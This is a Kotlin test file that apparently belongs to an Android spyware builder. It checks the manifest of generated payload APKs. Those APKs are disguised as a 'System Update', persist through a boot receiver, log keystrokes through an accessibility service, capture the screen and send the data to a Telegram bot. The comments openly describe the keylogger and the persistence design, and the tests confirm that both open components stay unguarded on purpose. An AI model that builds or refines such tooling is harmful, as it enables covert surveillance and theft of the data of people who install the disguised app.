package com.vector.console.data.payload

import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertNotNull
import org.junit.Assert.assertTrue
import org.junit.Test
import java.io.File

/**
 * Gate on the open surface of the shipped manifest.
 *
 * The manifest declares three components reachable from outside the app, and every one of them is
 * load-bearing: the launch activity is how a recipient starts onboarding, the boot receiver is the
 * entire persistence story, and the accessibility binding is the keylogger. Two of the three are
 * deliberately unguarded. Anything extra that turns up exported is a new way in that nobody chose.
 *
 * Runs against the real template and against a real build, because the template is the source and
 * the build is what ships. Both must show the same surface.
 */
class ManifestSurfaceTest {

    private val pkg = "com.mobilesvc.agent"

    private val expectedReachable = setOf(
        "activity $pkg.MainActivity",
        "receiver $pkg.BootReceiver",
        "service $pkg.KeyloggerService"
    )

    private val expectedOpen = setOf(
        "activity $pkg.MainActivity",
        "receiver $pkg.BootReceiver"
    )

    private fun templateManifest(): ByteArray {
        val archive = ZipArchive.read(
            ZipArchive.stripSigningBlock(File("src/main/assets/payload/template.apk").readBytes())
        )
        return inflate(archive.find("AndroidManifest.xml")!!)
    }

    private fun builtManifest(): ByteArray {
        val spec = PayloadSpec(
            label = "System Update",
            collectScreen = true,
            collectKeylog = true,
            transport = PayloadSpec.Transport.TELEGRAM,
            telegramToken = "123456789:" + "A".repeat(35),
            telegramChatId = "1"
        )
        val built = PayloadPackager.build(
            File("src/main/assets/payload/template.apk").readBytes(),
            spec,
            ApkSignerV2.generateCredentials()
        )
        val archive = ZipArchive.read(ZipArchive.stripSigningBlock(built.apk))
        return inflate(archive.find("AndroidManifest.xml")!!)
    }

    private fun inflate(entry: ZipArchive.Entry): ByteArray {
        if (entry.method != ZipArchive.METHOD_DEFLATE) return entry.payload
        return java.util.zip.Inflater(true).run {
            setInput(entry.payload)
            val out = java.io.ByteArrayOutputStream()
            val buffer = ByteArray(8192)
            while (!finished()) {
                val read = inflate(buffer)
                if (read == 0 && needsInput()) break
                out.write(buffer, 0, read)
            }
            end()
            out.toByteArray()
        }
    }

    private fun surfaceOf(manifest: ByteArray): List<ManifestSurface.Component> {
        val components = ManifestSurface.components(manifest)
        assertNotNull("manifest did not parse", components)
        return components!!
    }

    @Test
    fun `template reaches exactly the three intended components`() {
        val reachable = surfaceOf(templateManifest())
            .filter { it.exported }
            .map { "${it.kind} ${it.name}" }
            .toSet()
        assertEquals(expectedReachable, reachable)
    }

    @Test
    fun `a build reaches exactly the same three components`() {
        val reachable = surfaceOf(builtManifest())
            .filter { it.exported }
            .map { "${it.kind} ${it.name}" }
            .toSet()
        assertEquals(expectedReachable, reachable)
    }

    @Test
    fun `the accessibility service is guarded and the other two are not`() {
        val open = surfaceOf(builtManifest())
            .filter { it.open }
            .map { "${it.kind} ${it.name}" }
            .toSet()
        assertEquals(expectedOpen, open)
    }

    @Test
    fun `hosting components stay internal`() {
        val byName = surfaceOf(builtManifest()).associateBy { it.name }
        assertFalse(byName.getValue("$pkg.PayloadService").exported)
        assertFalse(byName.getValue("$pkg.NotificationRelay").exported)
        // And the guarded one really carries a permission rather than relying on the export flag.
        assertTrue(byName.getValue("$pkg.KeyloggerService").guarded)
    }

    @Test
    fun `an unparseable manifest reports null rather than a clean surface`() {
        assertEquals(null, ManifestSurface.components(ByteArray(64) { 0x41 }))
        assertEquals(null, ManifestSurface.components(ByteArray(0)))
    }
}
